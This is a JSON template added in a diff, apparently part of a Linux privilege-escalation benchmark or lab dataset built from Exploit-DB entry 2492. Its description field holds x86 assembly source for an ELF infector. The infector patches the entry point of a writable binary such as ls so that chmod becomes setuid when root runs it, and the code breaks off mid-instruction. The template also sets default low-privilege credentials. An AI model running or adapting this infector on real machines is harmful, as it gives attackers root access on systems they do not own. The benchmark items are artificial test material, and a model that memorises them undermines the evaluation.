@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_2492",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: .ELF Binaries - Local Privilege Escalation\n\nExploit source code (2492.s):\n```\n# gcc infR3.s -o infR3\n# strip infR3\n# find a writable binary (example: ls)\n# ./infR3 /bin/ls\n# when root calls the writable ls, chmod will be setuided\n# Coded by jolmos@7a69ezine.org == sha0@BadCheckSum.com\n\n.text\n.global main\n\t\t\t# infeccion de _start para conseguir local root\n\t\t\t# use at your own risk\n\t\t\t#\n\t\t\t# Coded by jolmos@7a69ezine.org == sha0@BadCheckSum.com\n\t\t\t#\n\t\t\t# GPLv2\nmain:\n\tpush %ebp\n\tmovl %esp, %ebp\n\tsubl $500, %esp  \t#si el codigo del bicho es mas grande, habra k ampliar este buffer\n\nget_param:\n\tmovl 0x0c(%ebp), %eax\n\tmovl 4(%eax), %ebx\t# ebx  ->  argv[1]\n\nopen_host:\n\tmovl $5, %eax\n\tmovl $2, %ecx\n\tint $0x80\n\tmovl %eax, -4(%ebp)\t# descriptor en -4\n\ncalc_len:\n\tmovl $19, %eax\n\tmovl -4(%ebp), %ebx\n\txorl %ecx, %ecx\n\tmovl $2, %edx\n\tint $0x80\n\tmovl %eax, -8(%ebp)\t# longitud del host en -8\n\nmapeo:\n\tmovl $90, %eax\n\txorl %ecx, %ecx\n\tpushl %ecx\t\t# offset 0\n\tpushl -4(%ebp)\t\t# descriptor\n\tpushl $1\t\t# privado     0x22\n\tpushl $3\t\t# read|write  0x07\n\tpushl -8(%ebp) \t\t# size\n\tpushl %ecx\t\t# nulo, para que nos indique mmap donde.\n\tmovl %esp, %ebx\n\tint $0x80\n\tcmp $0xfffff000, %eax\n\tjbe ident\n\n\t# error en el mapa\n\tjmp ending\n\nident:\n\tmovl %eax, -12(%ebp)     # -12  -> VA del mapa\n\t\t\t\t # eax  -> VA del mapa\n\n\tcmpl $0x464c457f, (%eax)\t # es elf?\n\tjne  not_elf\n\tcmpb $0x02, 0x10(%eax)\t\t # es ejecutable?\n\tjne  not_elf\n\tcmpl $0xde, 0x07(%eax)\t # comprobar si ya ha sido infectado\n\tje   not_elf\n\n\tmovl $0xde, 0x07(%eax)\t # Marca de infeccion\n\nguarda_init:\n\tmovl $end_vir, %ecx\n\t#addl $5, %ecx\n\tsubl $start_vir, %ecx\n\tmovl %ecx,-16(%ebp)\t# -16 -> size del virus + 5\n\t\t\t\t# ecx -> size del virus + 5\n\n\tleal -500(%ebp), %edi\t# edi  -> -500\n\tmovl 0x18(%eax), %esi\t# esi  -> RVA e_entry\n\tmovl 0x2c(%eax), %ecx\t# Numero de PH's (e_phnum) (cuenta atras)\n\nprimer_ph:\n\tmovl 0x1c(%eax), %edx\t# edx  -> RVA e_phoff\n\taddl %eax, %edx\t\t# edx  -> VA  e_phoff\n\nbusca_ph:\n\tcmpl %esi, 0x08(%edx)\t# if e_entry > p_vaddr => siguiente PH\n\tjna destino\n\nsiguiente_ph:\n\taddl 0x2a(%edx), %edx\n\tloop    busca_ph\n\n\ndestino: ######### LA CLAVE DE TODO ##########\n\tsubl 0x08(%edx), %esi   # esi  -> RVA e_entry-p_vaddr\n\taddl 0x04(%edx), %esi   # esi  -> RVA e_entry-p_vaddr+p_offset\n\t#addl $0x34, %esi\t# alineacion #subl $0x30 -> _init\n\t                                     #addl $0x34 -> _start (p_offset)\n\t#subl $0x65, %esi\n\taddl %eax, %esi\t\t# esi  -> VA  e_entry-p_vaddr+p_offset\n\tmovl %esi, %edx\n\nsalvo_start:\n\tmovl -16(%ebp), %ecx\t# virus size\n\trep movsb\t\t# copiando _start en -400\n\nguarda_virus:\n\tmovl %edx, %edi\t\t# edi  -> VA del entry point\n\tmovl $start_vir, %esi\t# esi  -> VA del inicio del virus\n\tmovl -16(%ebp), %ecx\t# ecx  -> size del virus\n\trep movsb\n\n\tjmp sincroniza\n\nnot_elf:\n\tmovl $4, %eax\n\tmovl $1, %ebx\n\tmovl $notelf, %ecx\n\tmovl $28, %edx\n\tint $0x80\n\nsincroniza:\n\tmovl %eax, %ebx\t\t# ebx  -> mapa\n\tmovl $144, %eax\t\t# eax  -> msync\n\tmovl -8(%ebp),%ecx\t# ecx  -> size del mapa\n\tmovl $2, %edx\t\t# edx  -> flags\n\tint $0x80\n\ndesmapea:\n\tmovl $91, %eax\n\tmovl -12(%ebp), %ebx\t# VA inicial del mapa\n\tmovl -8(%ebp\n```",
+  "cve": "",
+  "exploitdb_id": "2492",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_2492",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
